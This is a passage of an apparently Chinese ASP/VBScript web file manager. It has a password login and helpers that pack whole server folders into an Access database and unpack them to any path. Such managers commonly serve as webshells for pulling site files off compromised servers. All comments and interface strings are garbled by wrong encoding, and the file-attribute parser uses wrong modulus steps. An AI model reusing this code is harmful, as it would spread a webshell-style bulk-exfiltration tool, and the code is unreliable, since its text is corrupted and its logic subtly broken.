<tr><th colspan="2">FSO�ļ������ - �û���¼</th></tr>
<tr>
<td>�������¼���룺</td>
<td><input type="password" size="30" name="password">&nbsp;<input type="submit" value="��¼" class="b"></td>
</tr>
</table>
</form>
<% =Copyright %>
</body>
</html>
<%
End Sub

'�û���¼��֤
Sub LoginChk()
	If Request.Form("password")<>Password Then
		EchoBack "һ�򵱹أ����Ī�����������벻��ȷ��"
		Exit Sub
	Else
		Session(mss & "IsAdminlogin")=True
		Response.Redirect "?page=fso"
	End If
End Sub

'�û��˳�
Sub Logout()
	Session(mss & "IsAdminlogin")=False
	Response.Redirect "?"
End Sub
'��ʾһ��ͼƬ
Sub Page_Img()
	Dim HexStr
	HexStr="47 49 46 38 39 61 01 00 19 00 C4 00 00 6D 92 DA 66 8C D9 7E 9E DF 7B 9C DE 81 A0 DF 79 9A DD 62 89 D8 97 B1 E5 71 94 DB 84 A3 E0 58 81 D5 91 AC E3 5A 84 D6 69 8E DA 65 8B D8 8A A7 E2 76 98 DD 5E 86 D7 61 88 D7 74 97 DC 5D 86 D6 5C 85 D6 6E 92 DB 55 80 D5 6A 8F DA 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 21 F9 04 00 00 00 00 00 2C 00 00 00 00 01 00 19 00 40 05 15 60 85 09 87 31 3D 51 60 15 C9 72 29 0C 25 39 0D 80 40 03 11 02 00 3B"
	Response.ContentType="IMAGE/GIF"
	WriteBytes HexStr
End Sub

'���Css
Sub Page_Css()
%>
body
{
font-family: Verdana, Arial, "����";
font-size: 12px;
line-height: 1.5em;
color: #000000;
}
input,select,textarea
{
font-family: Verdana, Arial, "����";
font-size: 12px;
color: #000000;
}
a:link
{
font-size: 12px;
color: #000000;
text-decoration: none;
}
a:visited
{
font-size: 12px;
color: #000000;
text-decoration: none;
}
a:active
{
font-size: 12px;
line-height: normal;
color: #333333;
text-decoration: none;
}
a:hover
{
font-size: 12px;
color: #FF7F24;
text-decoration: underline;
}
hr { height:1px; color:#6595D6; }

table
{
BORDER-COLLAPSE: collapse;
}
table.border
{
border: 1px solid #6595D6;
}
td
{
font-family: Verdana, Arial, "����";
font-size: 12px;
line-height: 1.5em;
color: #000000;
}
td.border
{
border: 1px solid #6595D6;
}
td.inner
{
font-family: Verdana, Arial, "����";
font-size: 12px;
line-height: 1.5em;
color: #000000;
border: 0px;
}
th
{
font-family: Verdana, Arial, "����";
font-size: 12px;
line-height: 1.5em;
color: #FFFFFF;
height:25px;
background-color:#427FBB;
background-image:url(?page=img);
}
th.border
{
border: 1px solid #6595D6;
}
.b { width:55px; height:22px; font-size:12px; }
<%
End Sub

'================ Functions ==================
Function IsFolder(ByVal fname)
	IsFolder=oFso.FolderExists(fname)
End Function

Function IsFile(ByVal fname)
	IsFile=oFso.FileExists(fname)
End Function

'�ֽ���ͳ�� Bytes
Function SizeCount(ByVal iSize)
	On Error Resume Next
	Dim size,showsize
	size=iSize
	showsize=size & "&nbsp;Byte" 
	if size>1024 then
	   size=(Size/1024)
	   showsize=formatnumber(size,3) & "&nbsp;KB"
	end if
	if size>1024 then
	   size=(size/1024)
	   showsize=formatnumber(size,3) & "&nbsp;MB"		
	end if
	if size>1024 then
	   size=(size/1024)
	   showsize=formatnumber(size,3) & "&nbsp;GB"	   
	end if   
	SizeCount = showsize
End Function

'16�����ַ�ת10��������
Function Hex2Num(v)
	Dim w
	If IsNumeric(v) Then
		w=Int(v)
	Else
		Select Case UCase(v)
			Case "A": w=10
			Case "B": w=11
			Case "C": w=12
			Case "D": w=13
			Case "E": w=14
			Case "F": w=15
			Case Else: w=0
		End Select
	End If
	Hex2Num=w
End Function
'ȡ���ֽ��ַ�������ֵ
Function Byte2Num(sByte)
	Dim b1,b2
	b1=Left(sByte,1)
	b2=Right(sByte,1)
	Byte2Num=Hex2Num(b1)*16+Hex2Num(b2)
End Function
'��16�����ֽ��ַ������Ϊ����������
Function WriteBytes(sBytes)
	Dim sByte,i
	sByte=Split(sBytes," ")
	For i=0 To UBound(sByte)-1
		Response.BinaryWrite ChrB(Byte2Num(sByte(i)))
	Next
End Function

'����ļ�ͼ��
Function getFileIcon(extName)
	Select Case LCase(extName)
		Case "vbs", "h", "c", "cfg", "pas", "bas", "log", "asp", "txt", "php", "ini", "inc", "htm", "html", "xml", "conf", "config", "jsp", "java", "htt", "lst", "aspx", "php3", "php4", "js", "css", "asa"
			getFileIcon = "Wingdings>2"
		Case "wav", "mp3", "wma", "ra", "wmv", "ram", "rm", "avi", "mpg"
			getFileIcon = "Webdings>��"
		Case "jpg", "bmp", "png", "tiff", "gif", "pcx", "tif"
			getFileIcon = "'webdings'>&#159;"
		Case "exe", "com", "bat", "cmd", "scr", "msi"
			getFileIcon = "Webdings>1"
		Case "sys", "dll", "ocx"
			getFileIcon = "Wingdings>&#255;"
		Case Else
			getFileIcon = "'Wingdings 2'>/"
	End Select
End Function

'��ô�������
Function getDriveType(num)
	Select Case num
		Case 0
			getDriveType = "δ֪"
		Case 1
			getDriveType = "���ƶ�����"
		Case 2
			getDriveType = "����Ӳ��"
		Case 3
			getDriveType = "�������"
		Case 4
			getDriveType = "CD-ROM"
		Case 5
			getDriveType = "RAM ����"
	End Select
End Function

'�ж��Ƿ�Ϊ�ű��ļ�
Function IsScriptFile(Ext)
	Const ScriptExts="asp,aspx,asa,php"
	IsScriptFile=False
	Dim FileExt,Exts
	FileExt=LCase(Ext)
	Exts=Split(ScriptExts,",")
	Dim i
	For i=0 To UBound(Exts)-1
		If Exts(i)=FileExt Then
			IsScriptFile=True
			Exit Function
		End If
	Next
	IsScriptFile=False
End Function

'������Ϣ���ر�
Sub EchoClose(msg)
	Response.Write "<script language=""Javascript"">alert("""&msg&""");window.close();</script>"
End Sub
'������Ϣ���ر�
Sub EchoBack(msg)
	Response.Write "<script language=""Javascript"">alert("""&msg&""");history.back();</script>"
End Sub

'�ļ�������
Class FileAttrib_Cls
Public n,r,h,s,d,a,al,c
Private Sub Class_Initialize()
	n=0:r=0:h=0:s=0:d=0:a=0:al=0:c=0
End Sub
Public Property Let Attrib(v)
	If v=0 Then
		n=1
		Exit Property
	End If
	If v>=2048 Then
		c=1
		v=v Mod 2048
	End If
	If v>=1024 Then
		al=1
		v=v Mod 64
	End If
	If v>=32 Then
		a=1
		v=v Mod 32
	End If
	If v>=16 Then
		d=1
		v=v Mod 8
	End If
	If v>=4 Then
		s=1
		v=v Mod 4
	End If
	If v>=2 Then
		h=1
		v=v Mod 2
	End If
	If v>=1 Then
		r=1
	End If
End Property
End Class

'============================ �ļ������������� =============================
'�ļ����
Sub Pack(ByVal FPath, ByVal sDbPath)
	Server.ScriptTimeOut=900
	Dim DbPath
	If Right(sDbPath,4)=".mdb" Then
		DbPath=sDbPath
	Else
		DbPath=sDbPath&".mdb"
	End If

	If oFso.FolderExists(DbPath) Then
		EchoBack "���ܴ������ݿ��ļ���"&Replace(DbPath,"\","\\")
		Exit Sub
	End If
	If oFso.FileExists(DbPath) Then
		oFso.DeleteFile DbPath
	End If

	If IsFolder(FPath) Then
		RootPath=GetParentFolder(FPath)
		If Right(RootPath,1)<>"\" Then RootPath=RootPath&"\"
	Else
		EchoBack "�������ļ���·����"
		Exit Sub
	End If

	Dim oCatalog,connStr,DataName
	Set conn=Server.CreateObject("ADODB.Connection")
	Set oStream=Server.CreateObject("ADODB.Stream")
	Set oCatalog=Server.CreateObject("ADOX.Catalog")
	Set rs=Server.CreateObject("ADODB.RecordSet")
	On Error Resume Next
	connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & DbPath
	oCatalog.Create connStr
	If Err Then
		EchoBack "���ܴ������ݿ��ļ���"&Replace(DbPath,"\","\\")
		Exit Sub
	End If
	Set oCatalog=Nothing
	conn.Open connStr
	conn.Execute("Create Table Files(ID int IDENTITY(0,1) PRIMARY KEY CLUSTERED, FilePath VarChar, FileData Image)")
	oStream.Open
	oStream.Type=1
	rs.Open "Files",conn,3,3
	DataName=Left(oFso.GetFile(DbPath).Name,InstrRev(oFso.GetFile(DbPath).Name,".")-1)
	NoPackFiles=Replace(NoPackFiles,"<$datafile>",DataName)

	FailFileList=""		'���ʧ�ܵ��ļ��б�
	PackFolder FPath
	If FailFilelist="" Then
		EchoClose "�ļ��д���ɹ���"
	Else
		Response.Write "<link rel='stylesheet' type='text/css' href='?page=css'>"
		Response.Write "<Script Language='JavaScript'>alert('�ļ��д����ɣ�\n�����Ǵ��ʧ�ܵ��ļ��б�');</Script>"
		Response.Write "<body>"&Replace(FailFilelist,"|","<br>")&"</body>"
	End If
	oStream.Close
	rs.Close
	conn.Close
End Sub
'����ļ��У��ݹ飩
Sub PackFolder(FolderPath)
	If Not IsFolder(FolderPath) Then Exit Sub
	Dim oFolder,sFile,sFolder
	Set oFolder=oFso.GetFolder(FolderPath)
	For Each sFile In oFolder.Files
		If InStr(NoPackFiles,"|"&sFile.Name&"|")<1 Then
			PackFile sFile.Path
		End If
	Next
	Set sFile=Nothing
	For Each sFolder In oFolder.SubFolders
		PackFolder sFolder.Path
	Next
	Set sFolder=Nothing
End Sub
'����ļ�
Sub PackFile(FilePath)
	Dim RelPath
	RelPath=Replace(FilePath,RootPath,"")
	'Response.Write RelPath & "<br>"
	On Error Resume Next
	Err.Clear
	Err=False
	oStream.LoadFromFile FilePath
	rs.AddNew
	rs("FilePath")=RelPath
	rs("FileData")=oStream.Read()
	rs.Update
	If Err Then
		'һ���ļ����ʧ��
		FailFilelist=FailFilelist&FilePath&"|"
	End If
End Sub

'===========================================================================
'�ļ����
Sub UnPack(vFolderPath,DbPath)
	Server.ScriptTimeOut=900
	Dim FilePath,FolderPath,sFolderPath
	FolderPath=vFolderPath
	FolderPath=Trim(FolderPath)
	If Mid(FolderPath,2,1)<>":" Then
		EchoBack "·����ʽ�����޷�������Ŀ¼��"
		Exit Sub
	End If

	If Right(FolderPath,1)="\" Then FolderPath=Left(FolderPath,Len(FolderPath)-1)
	Dim connStr
	Set conn=Server.CreateObject("ADODB.Connection")
	Set oStream=Server.CreateObject("ADODB.Stream")
	Set rs=Server.CreateObject("ADODB.RecordSet")
	connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & DbPath
	On Error Resume Next
	Err=False
	conn.Open connStr
	If Err Then
		EchoBack "���ݿ�򿪴���"
		Exit Sub
	End If
	Err=False
	oStream.Open
	oStream.Type=1
	rs.Open "Files",conn,1,1
	FailFilelist=""		'���ʧ���ļ��б�
	Do Until rs.EOF
		Err.Clear
		Err=False
		FilePath=FolderPath&"\"&rs("FilePath")
		FilePath=Replace(FilePath,"\\","\")
		sFolderPath=Left(FilePath,InStrRev(FilePath,"\"))
		If Not oFso.FolderExists(sFolderPath) Then
			CreateFolder(sFolderPath)
		End If
		oStream.SetEos()
		oStream.Write rs("FileData")
		oStream.SaveToFile FilePath,2

		If Err Then		'���ʧ���ļ���Ŀ
			FailFilelist=FailFilelist&rs("FilePath").Value&"|"
		End If

		rs.MoveNext
	Loop
	rs.Close
	Set rs=Nothing
	conn.Close
	Set conn=Nothing
	Set oStream=Nothing
	If FailFilelist="" Then
		EchoClose "�ļ�����ɹ���"
	Else
		Response.Write "<link rel='stylesheet' type='text/css' href='?page=css'>"
		Response.Write "<Script Language='JavaScript'>alert('�ļ��д����ɣ�\n�����Ǵ��ʧ�ܵ��ļ��б�����');</Script>"
		Response.Write "<body>"&Replace(FailFilelist,"|","<br>")&"</body>"
	End If
End Sub
'===========================================================================

'===========================================================================
'�����ļ��У��ݹ飩
Function CreateFolder(FolderPath)
	On Error Resume Next
	Err=False
	Dim sParFolder
	sParFolder=GetParentFolder(FolderPath)
	If Not oFso.FolderExists(sParFolder) Then
		CreateFolder(sParFolder)
	End If
	oFso.CreateFolder(FolderPath)
	If Err Then
		CreateFolder=False
	Else
		CreateFolder=True
	End If
End Function
Function GetParentFolder(Path)
	Dim sPath
	sPath=Path
	If Right(sPath,1)="\" Then sPath=Left(sPath,Len(sPath)-1)
	sPath=Left(sPath,InstrRev(sPath,"\")-1)
	GetParentFolder=sPath
End Function
'============================================================================
Sub wv(v)
If v>0 Then Response.Write " checked "
End Sub
%>